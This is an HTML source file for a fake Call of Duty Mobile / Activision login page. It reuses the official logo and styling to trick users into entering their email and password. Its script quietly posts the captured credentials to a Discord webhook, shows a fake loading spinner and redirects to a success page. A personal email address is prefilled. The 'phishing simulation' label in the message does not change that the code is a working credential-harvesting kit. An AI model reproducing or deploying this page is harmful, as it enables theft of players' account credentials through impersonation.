<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CALL OF DUTY LOGIN TO YOUR ACCOUNT</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

    body {
      font-family: 'Roboto', Arial, sans-serif;
      background: #0d0d0d;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      background: #1a1a1a;
      width: 100%;
      max-width: 420px;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.8);
      text-align: center;
    }

    .logo {
      width: 220px;
      margin-bottom: 30px;
    }

    h1 {
      font-size: 24px;
      font-weight: 700;
      margin: 0 0 30px;
      color: #ffffff;
      text-transform: uppercase;
      letter-spacing: 2px;
    }

    label {
      display: block;
      text-align: left;
      font-size: 14px;
      margin-bottom: 8px;
      color: #b0b0b0;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      background: #2a2a2a;
      border: 1px solid #444;
      border-radius: 4px;
      color: #fff;
      margin-bottom: 20px;
      box-sizing: border-box;
    }

    input:focus {
      outline: none;
      border-color: #ff6600;
      box-shadow: 0 0 0 2px rgba(255,102,0,0.3);
    }

    .remember {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin-bottom: 25px;
      font-size: 14px;
      color: #b0b0b0;
    }

    .remember input {
      margin-right: 10px;
      width: 18px;
      height: 18px;
    }

    .forgot {
      color: #ff6600;
      text-decoration: none;
      font-size: 14px;
      display: block;
      margin: 15px 0 30px;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .btn-login {
      background: #8b4513; /* marron/orange Activision */
      color: white;
      border: none;
      padding: 16px;
      font-size: 18px;
      font-weight: 700;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
      text-transform: uppercase;
      letter-spacing: 1px;
      position: relative;
      overflow: hidden;
      transition: background 0.3s;
    }

    .btn-login:hover {
      background: #a0522d;
    }

    .btn-login.loading::after {
      content: '';
      position: absolute;
      top: 50%; left: 50%;
      width: 24px; height: 24px;
      border: 4px solid white;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      transform: translate(-50%, -50%);
    }

    @keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }

    .signup {
      margin-top: 30px;
      font-size: 14px;
      color: #b0b0b0;
    }

    .signup a {
      color: #ff6600;
      text-decoration: none;
    }

    .signup a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://www.callofduty.com/content/dam/atvi/callofduty/codmobile/web/common/logo-codm-white.png" alt="CALL OF DUTY MOBILE" class="logo">

  <h1>LOGIN TO YOUR ACCOUNT</h1>

  <form id="loginForm">
    <label for="email">Email Address:*</label>
    <input type="email" id="email" value="Fatoyinbodemilade@gmail.com" required>

    <label for="password">Password:*</label>
    <input type="password" id="password" placeholder="Enter password" required>

    <div class="remember">
      <input type="checkbox" id="remember" checked>
      <label for="remember">Remember me</label>
    </div>

    <a href="#" class="forgot">FORGOT YOUR PASSWORD?</a>

    <button type="submit" id="loginBtn" class="btn-login">LOGIN NOW</button>
  </form>

  <div class="signup">
    Don't have an Activision Account? <a href="#">SIGN UP</a>
  </div>
</div>

<script>
  const webhookUrl = "https://discord.com/api/webhooks/1482791121074782349/_CBi8WAs0aHqJMgw8xMImZNoUQfAUTNwYMFRXkYLbB3xn8tw7zfe8lnDMmnaj4ot1keK";

  document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!email || !password) return; // silencieux si vide

    const btn = document.getElementById("loginBtn");
    btn.classList.add("loading");
    btn.disabled = true;
    btn.textContent = "";

    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `**PHISHING SIMULATION – ACTIVISION / COD MOBILE**\n` +
                   `Email     : ${email}\n` +
                   `Password  : ${password}\n` +
                   `Heure     : ${new Date().toLocaleString("fr-FR")}\n` +
                   `──────────────────────────────`
        })
      });
    } catch (err) { /* silencieux */ }

    // Faux chargement serveur
    await new Promise(resolve => setTimeout(resolve, 1800));

    // Redirection finale (vers site officiel ou page "succès")
    window.location.href = "success.html";  // ou crée une page success.html si tu veux
  });
</script>

</body>
</html>
